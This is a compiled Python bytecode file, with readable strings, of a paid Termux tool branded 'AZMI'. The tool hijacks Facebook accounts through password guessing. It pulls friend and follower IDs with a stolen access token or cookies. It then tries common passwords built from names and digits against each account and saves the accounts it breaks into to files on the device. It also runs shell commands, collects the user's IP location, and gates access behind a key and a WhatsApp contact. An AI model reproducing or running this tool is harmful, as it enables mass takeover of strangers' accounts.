a
    ��`��  �                	   @   s�  d dl Z d dlZd dlZd dlZd dlZd dlZd dlZd dlZd dlZd dl	Z	d dl
Z
d dlZd dlZd dlZd dlmZ d dlmZ dZe �d� ze �d� W n ey�   Y n0 e�dd�Ze�d	d
�Zee�ee�ee�dddddd�Ze �d� e �d� ee� e�d� dZdd� Zdd� Zdd� Z dd� Z!dd� Z"dd � Z#d!d"� Z$d#d$� Z%d%d&� Z&d'd(� Z'd)d*� Z(d+d,� Z)d-d.� Z*d/d0� Z+d1d2� Z,d3d4� Z-d5d0� Z+d6d7� Z.d8d9� Z/e0d:k�r�e�  dS );�    N)�
ThreadPool)�ConnectionError�AZMIztermux-setup-storagez/sdcard/idsg    �sAg    8�|Ai N  i@�  �	EXCELLENTz!cell.CTRadioAccessTechnologyHSDPAa  Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]z!application/x-www-form-urlencoded�Liger)zx-fb-connection-bandwidthzx-fb-sim-hnizx-fb-net-hnizx-fb-connection-qualityzx-fb-connection-type�
user-agent�content-typezx-fb-http-enginezgit pull�clear�utf8ut  
[0;34m     █████  ███████ ███    ███ ██
[1;34m    ██   ██      ██ ████  ████ ██
[0;94m    ███████   ███   ██ ████ ██ ██
[1;94m    ██   ██ ██      ██  ██  ██ ██
[1;34m    ██   ██ ███████ ██      ██ ██

[1;96m-----------------------------------------------
[1;92m       AUTHOR    : AZMI
[1;92m       WHATSAPP  : MAI NAHI BATAOGI
[1;96m                 : THIS IS PAID TOOL
[1;96m-------- [1;93mXzee[1;96m ---------------------------------
     c               	   C   s|  t �d� tt� td� d} td�}|| krdtd� td� t�d� td� td� t �d� ntd� td� t �d� td	� t�d
� ztdd��� }W n t	t
fy�   t�  Y n0 t�d�j}||v �r*t �d� tt� td� t �d� t �d� t �d� t �d� t�d� t�  nNt �d� tt� td� td� td� td�|  td� t �d� t�  d S )Nr	   � �Xzee007z  [1;93mENTER KEY: z[1;95m z[1;32;1m WELCOME TO MY TOOL�   z
	ACTIVATED� �   �/sdcard/.Azmi.txt�rz>https://raw.githubusercontent.com/xzmi007/Xzee/main/server.txtzcd ..... && npm installzfuser -k 5000/tcp &�#zcd ..... && node index.js &�   z    [1;37mApproved Failedz( [1;92mYour Id Is Not Approved Already z% [1;92mCopy the id and send to ownerz [1;96mYour id: z[1;93m Press enter to send id�$xdg-open https://wa.me/+923459690608)�os�system�print�logo�	raw_input�time�sleep�open�read�KeyError�IOError�reg2�requests�get�text�ip�reg)�CorrectUsername�username�tor   � r)   �/sdcard/Exe/xzee.pyr%   /   sR    












r%   c                  C   s�   t �d� tt� td� td� td� td� t�� jd d� } td�|   td� td� t �d� td	d
�}|�	| � |�
�  td� t�  d S )Nr	   z     [1;37mApproval not detectedz? [1;92mCopy and press enter , then select WhatsApp to continuer   �2   z
 Your id: z Press enter to go to WhatsApp r   z/sdcard/.AZMI.txt�wz&[1;92m Press enter to check Approval )r   r   r   r   �uuid�uuid4�hexr   r   �write�closer%   )�id�savr)   r)   r*   r    ^   s     



r    c                  C   s�   t �d� tt� td� z:t�d�} t�| j�}|d }|d }|d }|d }W n   Y n0 td�|  t	�
d	� td
�|  t	�
d	� td�|  t	�
d	� td�|  t	�
d	� td� t	�
d	� t�  d S )Nr	   z	Collecting device infozhttp://ip-api.com/json/�query�country�
regionName�ispz[1;92m Your ip: r   z[1;92m Your country: z[1;92m Your region: z [1;92mYour network: z Loading ...)r   r   r   r   r!   r"   �json�loadsr#   r   r   �log_menu)�ipinfo�z�ipsr5   �regi�networkr)   r)   r*   r$   q   s.    






r$   c               	   C   sx   zt dd�} t�  W n^ ttfyr   t�d� tt� td� td� td� td� td� td	� t�  Y n0 d S )
N�access_token.txtr   r	   z#[1;93m ~~~~ Login menu ~~~~[1;91m�/-----------------------------------------------z[1;92m[1] Login with FaceBookz[1;92m[2] Login with tokenz[1;92m[3] Login with cookiesr   )	r   �menur   r   r   r   r   r   �
log_menu_s)�t_checkr)   r)   r*   r:   �   s    


r:   c                  C   sZ   t d�} | dkrt�  n>| dkr(t�  n.| dkr8t�  ntd� td� td� t�  d S )Nz==>�1�2�3r   z\ Select valid option )r   �log_fb�	log_token�
log_cookier   rC   )�sr)   r)   r*   rC   �   s    rC   c                  C   s�   t �d� tt� td� td� td�} td�}z�t�dt d t �j	}t
�|�}d|v r�td	d
�}|�|d � |��  t�  n:d|d v r�td� td� t�  ntd� td� t�  W n&   td� td� t �d� Y n0 d S )Nr	   z[1;31;1mLogin with id/passrA   z[1;92m Id/mail/no: z [1;93mPassword: �http://localhost:5000/auth?id=�&pass=�locr@   r,   �www.facebook.com�errorz& User must verify account before loginz![1;92m Press enter to try again z Id/Pass may be wrong�! [1;92mPress enter to try again r   zExiting tool�exit)r   r   r   r   r   r!   r"   �uid�pwdr#   r8   r9   r   r0   r1   rB   rH   )�lid�pwds�data�q�tsr)   r)   r*   rH   �   s2    



rH   c                  C   sX   t �d� tt� td� td� td�} td� tdd�}|�| � |��  t�  d S )Nr	   z[1;93mLogin with token[1;91mrA   z! [1;92mPaste token here: [1;91mr@   r,   )	r   r   r   r   r   r   r0   r1   rB   )�tok�t_sr)   r)   r*   rI   �   s    


rI   c                  C   sJ  t �d� tt� td� td� td� zntd�} ddddd	d
ddd| d�
}tjd|d�}t�d|j	�}|�
d�}tdd�}|�|� |��  t�  W n� ty�   td� td� td� td� t�  Y nv t�y   td� td� td� td� t�  Y n> tjj�yD   td� td� td� td� t�  Y n0 d S )Nr	   r   z[1;31;1mLogin Cookiesz Paste cookies here: zlMozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Kiwi Chrome/68.0.3438.0 Safari/537.36zhttps://m.facebook.com/zm.facebook.comzhttps://m.facebook.comrE   z#id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7z	max-age=0zUtext/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8ztext/html; charset=utf-8)
r   �referer�host�originzupgrade-insecure-requestszaccept-languagezcache-control�acceptr   �cookiezGhttps://m.facebook.com/composer/ocelot/async_loader/?publisher=feed#_=_��headersz	(EAAA\w+)r   r@   r,   z	Invalid cookiesrQ   )r   r   r   r   r   r!   r"   �re�searchr#   �groupr   r0   r1   rB   �AttributeErrorr:   �UnboundLocalError�
exceptions�SSLError)r`   rW   �c1�c2�hasil�okr)   r)   r*   rJ   �   sR    
�





rJ   c               	   C   s�  t �d� ztdd��� } W n> ttfyZ   td� tt� td� t�	d� t
�  Y n0 z&t�d|  �}t�|j�}|d }W n� ttfy�   tt� td� td	� td� t �d
� t�	d� t
�  Y nF tjj�y   tt� td� td� td� td� t�  Y n0 t �d� tt� tdd��� }td�|  td� td�|  td� td� td� td� td� td� td� t�  d S )Nr	   r@   r   r   z [1;31;1mLogin FB id to continuer   z+https://graph.facebook.com/me?access_token=�namez	 Account Cheekpoint[0;97mzrm -rf access_token.txtz!	 Turn on mobile data/wifi[0;97mr   z6 [1;92mPress enter after turning on mobile data/wifi r   z   [1;92mLogged in user: [1;91mrA   z [1;93m Active token: [1;91mz, ------------------------------------------ z[1;92m[1] Auto password 10z[1;92m[2] Number password 20z$[1;92m[3] Name + Number password 12z[1;92m[4] Extract Filez[1;92m[5] Logoutz[1;92m[6] Delete trash files)r   r   r   r   r   r   r   r   r   r   r:   r!   r"   r8   r9   r#   rh   r   r   rB   �menu_s)�tokenr   rX   r<   rZ   r)   r)   r*   rB     sT    





rB   c                  C   s�   t d�} | dkrt�  nr| dkr(t�  nb| dkr8t�  nR| dkrLt�d� n>| dkr\t�  n.| dkrlt�  ntd	� td
� td	� t	�  d S )Nu   [1;97mâ°â==>â¤ rE   rF   rG   �4zpython2 ok.py�5�6r   z	Select valid option)
r   �
auto_crack�choice_crack�
name_crackr   r   �lout�rtrashr   ro   )�msr)   r)   r*   ro   0  s"    ro   c                	   C   s�   zt dd��� aW nH ttfyZ   t�d� tt� td� td� t	�
d� t�  Y n0 t�d� tt� td� td� td	� td
� td� td� t�  d S )N�	login.txtr   r	   �	 File Not Found [0;97mr   r   �*[1;93m~~~~ Auto pass cracking ~~~~[1;91mrA   �[1;92m[1] Public id cloning�[1;92m[2] Followers cloning�[1;92m[3] File cloning�[1;92m[0] Back�r   r   �toketr   r   r   r   r   r   r   r   r:   �a_sr)   r)   r)   r*   �crackE  s$    


r�   c                	   C   s�   zt dd��� aW nH ttfyZ   t�d� tt� td� td� t	�
d� t�  Y n0 t�d� tt� td� td� td	� td
� td� td� t�  d S )Nr@   r   r	   � 	 Login FB id to continue[0;97mr   r   r|   rA   r}   r~   r   r�   )r   r   rp   r   r   r   r   r   r   r   r   r:   r�   r)   r)   r)   r*   rt   \  s$    


rt   c               	      s�  g } g � g �t d�}|dk�r.t�d� tt� td� td� t d�}zTt�d| d t �}t�	|j
�}|d	 }t�d� tt� td
� td�|  W n, ttfy�   td� t d� t�  Y n0 t�d| d t �}t�	|j
�}|d D ]4}|d }|d	 }|�d�d }	| �|d |	 � q��n|dk�r~t�d� tt� td� td� td� td� t d�}
t d�}t d�}t d�}t d�}zTt�d| d t �}t�	|j
�}|d	 }t�d� tt� td� td�|  W n. ttf�y   td� t d� t�  Y n0 t�d| d t d �}t�	|j
�}|d D ]6}|d }|d	 }|�d�d }	| �|d |	 � �qDn�|dk�rt�d� tt� td � td� z0t d!�}t|d"��� D ]}| �|�� � �q�W n* t�y   td#� t d$� t�  Y n0 n,|d%k�rt�  ntd� td&�t  |�  td'�tt| ��  t�d(� td)� t�d(� td� td*� td� � �fd+d,�}td-�}|�|| � td� td.� td/�tt��� d0 tt� ��  td� t d1� t�  d S )2Nu    [1;97mâ°â==>â¤ rE   r	   z1[1;93m~~~~ Auto pass public cracking ~~~~[1;91mrA   �    [1;93m[â]Enter id: �https://graph.facebook.com/�?access_token=rn   z*[1;93m~~~~ Auto pass public cracking ~~~~� [1;92mCloning from: �	 Invalid user [0;97mrQ   �/friends?access_token=rW   r2   r   r   �|rF   �4[1;93m~~~~ Name pass followers cracking ~~~~[1;91m�5 [1;93mFor example:123,1234,12345,786,12,1122[1;91m� [1;92m[1]Name + digit: � [1;92m[2]Name + digit: � [1;92m[3]Name + digit: � [1;92m[4]Name + digit: �-[1;93m~~~~ Name pass followers cracking ~~~~� [1;92mPress enter to try again �/subscribers?access_token=�&limit=999999rG   z/[1;93m~~~~ Auto pass File cracking ~~~~[1;91m�[+] File Name: r   �[!] File Not Found.�Press Enter To Back. �0�	Choose valid option� Total ids: �      �?� [1;97mCrack Running[1;91m z(	[1;92m{AZMI007}  {Cloning Tool}[1;91mc                    s	  | }|� d�\}}�z�|�� d }tjd| d | td�j}t�|�}d|v r�td�| d | d	  t	d
d�}|�
|d | d � |��  ��|| � �n\d|d v r�td�| d |  t	dd�}|�
|d | d � |��  � �|| � �n|�� d }	tjd| d |	 td�j}t�|�}d|v �r�td�| d |	 d	  t	d
d�}|�
|d |	 d � |��  ��||	 � �ntd|d v �r�td�| d |	  t	dd�}|�
|d |	 d � |��  � �||	 � �n|�� d }
tjd| d |
 td�j}t�|�}d|v �rttd�| d |
 d	  t	d
d�}|�
|d |
 d � |��  ��||
 � �n�d|d v �r�td�| d |
  t	dd�}|�
|d |
 d � |��  � �||
 � �n.|�� d }tjd| d | td�j}t�|�}d|v �r^td�| d | d	  t	d
d�}|�
|d | d � |��  ��|| � �n�d|d v �r�td�| d |  t	dd�}|�
|d | d � |��  � �|| � �nDd}tjd| d | td�j}t�|�}d|v �r@td�| d | d	  t	d
d�}|�
|d | d � |��  ��|| � �n�d|d v �r�td�| d |  t	dd�}|�
|d | d � |��  � �|| � �nbd}tjd| d | td�j}t�|�}d|v �r"td�| d | d	  t	d
d�}|�
|d | d � |��  ��|| � �n�d|d v �r~td�| d |  t	dd�}|�
|d | d � |��  � �|| � �n�d}tjd| d | td�j}t�|�}d|v �rtd�| d | d	  t	d
d�}|�
|d | d � |��  ��|| � �n�d|d v �r`td�| d |  t	dd�}|�
|d | d � |��  � �|| � �n�d}tjd| d | td�j}t�|�}d|v �r�td�| d | d	  t	d
d�}|�
|d | d � |��  ��|| � �nd|d v �rBtd�| d |  t	dd�}|�
|d | d � |��  � �|| � �n�d}tjd| d | td�j}t�|�}d|v �r�td�| d | d	  t	d
d�}|�
|d | d � |��  ��|| � �n6d|d v �r"td�| d |  t	dd�}|�
|d | d � |��  � �|| � n�d}tjd| d | td�j}t�|�}d|v �r�td�| d | d	  t	d
d�}|�
|d | d � |��  ��|| � nXd|d v �r�td�| d |  t	dd�}|�
|d | d � |��  � �|| � W n   Y n0 d S )Nr�   �12345rL   rM   ra   rN   �[1;92m[OK] [1;32m� | �[0;97m�/sdcard/ids/AZMI_OK.txt�a�
rO   rP   �[1;31;1m[CP] �AZMI_CP.txt�1234�786�123�223344�334455�445566�pakistan�1234567�786000��split�lowerr!   r"   �headerr#   r8   r9   r   r   r0   r1   �append�apppend)�arg�userrS   rn   �pass1rW   rX   rm   �cp�pass2�pass3�pass4�pass5�pass6�pass7�pass8�pass9�pass10��cps�oksr)   r*   �main�  s6   






































za_s.<locals>.main�   � [1;92mCrack Done� [1;92mTotal Ok/[1;31;1mCp:�/� [1;93mPress enter to back)r   r   r   r   r   r!   r"   rp   r8   r9   r#   r   r   rt   �rsplitr�   r   �	readlines�stripr�   rB   r,   �str�lenr   r   r   �map)r2   r�   �idtr   rX   r<   �irS   �na�nm�p1�p2�p3�p4�idlist�liner�   �pr)   r�   r*   r�   s  s�    










 '$r�   c                	   C   s�   zt dd��� aW n@ ttfyR   t�d� tt� td� t	�
d� t�  Y n0 t�d� tt� td� td� td� td	� td
� td� t�  d S )Nrz   r   r	   r{   r   �,[1;93m~~~~ Number pass cracking ~~~~[1;91mrA   r}   r~   r   r�   )r   r   r�   r   r   r   r   r   r   r   r   r:   �c_sr)   r)   r)   r*   �crack_b�  s"    


r�   c                	   C   s�   zt dd��� aW n@ ttfyR   t�d� tt� td� t	�
d� t�  Y n0 t�d� tt� td� td� td� td	� td
� td� t�  d S )Nr@   r   r	   z&[1;93m~~~ Login FB id to continue ~~~r   r�   rA   r}   r~   r   r�   )r   r   rp   r   r   r   r   r   r   r   r   r:   r�   r)   r)   r)   r*   ru   �  s"    


ru   c               	      s|  g } g � g �t d�}|dk�rrt�d� tt� td� td� td� td� t d��t d��t d	��t d
��t d��t d��t d�}zTt�d| d t �}t�	|j
�}|d }t�d� tt� td� td�|  W n. ttf�y
   td� t d� t�  Y n0 t�d| d t �}t�	|j
�}|d D ]6}|d }|d }|�d�d }	| �|d |	 � �q6�nF|dk�r�t�d� tt� td� td� td� td� t d��t d��t d	��t d
��t d�}zTt�d| d t �}t�	|j
�}|d }t�d� tt� td� td�|  W n. ttf�yX   td� t d� t�  Y n0 t�d| d  t d! �}t�	|j
�}|d D ]6}|d }|d }|�d�d }	| �|d |	 � �q�n�|d"k�r�t�d� tt� td#� td� td� td� t d��t d��t d	��t d
��t d��t d��z0t d$�}
t|
d%��� D ]}| �|�� � �qFW n* t�y�   td&� t d'� t�  Y n0 n,|d(k�r�t�  ntd� td)�t  t�  td*�tt| ��  t�d+� td,� t�d+� td� td-� td� � �������fd.d/�}td0�}|�|| � td� td1� td2�tt��� d3 tt� ��  td� t d4� t�  d S )5Nu     [1;97mâ°â\X80==>â¤ rE   r	   z4[1;93m ~~~~ Number pass Public cracking ~~~~[1;91mrA   z6[1;93m For example:234567,223344,334455,445566[1;91mz [1;92m[1]Password: z [1;92m[2]Password: z [1;92m[3]Password: z [1;92m[4]Password: � [1;92m[5]Password: � [1;92m[6]Password: r�   r�   r�   rn   z-[1;93m ~~~~ Number pass Public cracking ~~~~z Cloning from: r�   z Press enter to try again r�   rW   r2   r   r   r�   rF   z6[1;93m~~~~ Number pass followers cracking ~~~~[1;91mz [1;93mEnter id: z/[1;93m~~~~ Number pass followers cracking ~~~~zPress enter to try again r�   r�   rG   z2[1;93m ~~~~ Number pass File cracking ~~~~[1;91mr�   r   r�   r�   r�   z	 Choose valid optionr�   r�   z$ [1;97m~~~ Crack Running ~~~[1;91mz'	[1;94m{AZMI007}  {Cloning Tool[1;91mc                    sR  | }|� d�\}}�z,tjd| d � td�j}t�|�}d|v r�td�| d � d  td	d
�}|�	|d � d � |�
�  ��|� � �n�d|d v r�td�| d �  tdd
�}|�	|d � d � |�
�  � �|� � �nNtjd| d � td�j}t�|�}d|v �rrtd�| d � d  td	d
�}|�	|d � d � |�
�  ��|� � �n�d|d v �r�td�| d �  tdd
�}|�	|d � d � |�
�  � �|� � �nptjd| d � td�j}t�|�}d|v �rPtd�| d � d  td	d
�}|�	|d � d � |�
�  ��|� � �n�d|d v �r�td�| d �  tdd
�}|�	|d � d � |�
�  � �|� � �n�tjd| d � td�j}t�|�}d|v �r.td�| d � d  td	d
�}|�	|d � d � |�
�  ��|� � �nd|d v �r�td�| d �  tdd
�}|�	|d � d � |�
�  � �|� � �n�tjd| d � td�j}t�|�}d|v �rtd�| d � d  td	d
�}|�	|d � d � |�
�  ��|� � �n2d|d v �rftd�| d �  tdd
�}|�	|d � d � |�
�  � �|� � n�tjd| d � td�j}t�|�}d|v �r�td�| d � d  td	d
�}|�	|d � d � |�
�  ��|� � nXd|d v �r>td�| d �  tdd
�}|�	|d � d � |�
�  � �|� � W n   Y n0 d S �Nr�   rL   rM   ra   rN   r�   r�   r�   r�   r�   r�   rO   rP   r�   r�   )r�   r!   r"   r�   r#   r8   r9   r   r   r0   r1   r�   r�   )r�   r�   rS   rn   rW   rX   rm   r�   �r�   r�   r�   r�   r�   r�   r�   r�   r)   r*   r�     s�    






















zc_s.<locals>.mainr�   r�   z[1;92m Total Ok/Cp:r�   z[1;93m Press enter to back)r   r   r   r   r   r!   r"   rp   r8   r9   r#   r   r   ru   r�   r�   rt   r   r�   r�   r�   rB   r,   r�   r�   r�   r   r   r   r�   �r2   r�   r�   r   rX   r<   r�   rS   r�   r�   r�   r�   r�   r�   r)   r�   r*   r�   �  s�    










`$r�   c                	   C   s�   zt dd��� aW nH ttfyZ   t�d� tt� td� td� t	�
d� t�  Y n0 t�d� tt� td� td� td	� td
� td� td� t�  d S )Nrz   r   r	   r{   r   r   �3[1;93m~~~~ Name + Number pass cracking ~~~~[1;91mrA   r}   r~   r   r�   r�   r)   r)   r)   r*   r�   �  s$    


c                	   C   s�   zt dd��� aW nH ttfyZ   t�d� tt� td� td� t	�
d� t�  Y n0 t�d� tt� td� td� td	� td
� td� td� t�  d S )Nr@   r   r	   r�   r   r   r�   rA   r}   r~   r   r�   )r   r   rp   r   r   r   r   r   r   r   r   r:   �n_sr)   r)   r)   r*   rv   �  s$    


rv   c               
      s�  g } g � g �t d�}|dk�r�t�d� tt� td� td� td� td� t d��t d��t d	��t d
��t d��t d��t d��t d��	t d�}zTt�d| d t �}t�	|j
�}|d }t�d� tt� td� td�|  W n. ttf�y   td� t d� t�  Y n0 t�d| d t �}t�	|j
�}|d D ]6}|d }|d }|�d�d }	| �|d |	 � �qF�nX|dk�r�t�d� tt� td� td� td� td� t d��t d��t d	��t d
��t d�}zTt�d| d t �}t�	|j
�}|d }t�d� tt� td � td�|  W n. ttf�yh   td� t d!� t�  Y n0 t�d| d" t d# �}t�	|j
�}|d D ]6}|d }|d }|�d�d }	| �|d |	 � �q��n|d$k�r�t�d� tt� td%� td� td� td� t d��t d��t d	��t d
��t d��t d��t d��t d��	z0t d&�}
t|
d'��� D ]}| �|�� � �qhW n* t�y�   td(� t d)� t�  Y n0 n,|d*k�r�t�  ntd� td+�t  |�  td,�tt| ��  t�d-� td.� t�d-� td� td/� td� � ���������	f
d0d1�}td2�}|�|| � td� td3� td4�tt��� d5 tt� ��  td� t d6� t�  d S )7Nu    [1;97mâ°âAzmiâ¤ rE   r	   z:[1;93m~~~~ Name + Number pass public cracking ~~~~[1;91mrA   z4[1;93mFor example:123,1234,12345,786,12,1122[1;91mr�   r�   r�   r�   r�   r�   z [1;92m[7]Password: z [1;92m[8]Password: r�   r�   r�   rn   z([1;93m~~~~Name pass public cracking~~~~r�   r�   rQ   r�   rW   r2   r   r   r�   rF   r�   r�   r�   r�   r�   r�   rG   z8[1;93m~~~~ Name + Number pass File cracking ~~~~[1;91mr�   r   r�   r�   r�   r�   r�   r�   r�   z'	[1;94m{AZMI007} {Cloning Tool}[1;91mc                    s>  | }|� d�\}}�z|�� � }tjd| d | td�j}t�|�}d|v r�td�| d | d  t	d	d
�}|�
|d | d � |��  ��|| � �n�d|d v r�td�| d |  t	dd
�}|�
|d | d � |��  � �|| � �n.|�� � }	tjd| d |	 td�j}t�|�}d|v �r�td�| d |	 d  t	d	d
�}|�
|d |	 d � |��  ��||	 � �n�d|d v �r�td�| d |	  t	dd
�}|�
|d |	 d � |��  � �||	 � �nD|�� � }
tjd| d |
 td�j}t�|�}d|v �rttd�| d |
 d  t	d	d
�}|�
|d |
 d � |��  ��||
 � �n�d|d v �r�td�| d |
  t	dd
�}|�
|d |
 d � |��  � �||
 � �nZ|�� � }tjd| d | td�j}t�|�}d|v �r^td�| d | d  t	d	d
�}|�
|d | d � |��  ��|| � �n�d|d v �r�td�| d |  t	dd
�}|�
|d | d � |��  � �|| � �nptjd| d � td�j}t�|�}d|v �r<td�| d � d  t	d	d
�}|�
|d � d � |��  ��|� � �n�d|d v �r�td�| d �  t	dd
�}|�
|d � d � |��  � �|� � �n�tjd| d � td�j}t�|�}d|v �rtd�| d � d  t	d	d
�}|�
|d � d � |��  ��|� � �nd|d v �rvtd�| d �  t	dd
�}|�
|d � d � |��  � �|� � �n�tjd| d � td�j}t�|�}d|v �r�td�| d � d  t	d	d
�}|�
|d � d � |��  ��|� � �n2d|d v �rRtd�| d �  t	dd
�}|�
|d � d � |��  � �|� � n�tjd| d �	 td�j}t�|�}d|v �r�td�| d �	 d  t	d	d
�}|�
|d �	 d � |��  ��|�	 � nXd|d v �r*td�| d �	  t	dd
�}|�
|d �	 d � |��  � �|�	 � W n   Y n0 d S r�   r�   )r�   r�   rS   rn   r�   rW   rX   rm   r�   r�   r�   r�   �
r�   r�   r�   r�   r�   r�   r�   r�   r�   r�   r)   r*   r�   %  s�    






























zn_s.<locals>.mainr�   r�   r�   r�   r�   )r   r   r   r   r   r!   r"   rp   r8   r9   r#   r   r   rv   r�   r�   rt   r   r�   r�   r�   rB   r,   r�   r�   r   r   r   r�   r�   r)   r�   r*   r�   �  s�    










 $r�   �__main__)1r   �sysr   �datetimerc   �	threadingr8   �randomr!   �getpass�hashlib�	cookielibr-   �string�multiprocessing.poolr   �requests.exceptionsr   �
__author__r   �mkdir�OSError�randint�bd�sim�reprr�   �reload�setdefaultencodingr   r%   r    r$   r:   rC   rH   rI   rJ   rB   ro   r�   rt   r�   r�   ru   r�   rv   r�   �__name__r)   r)   r)   r*   �<module>   s`   p
�


/+/   Y   
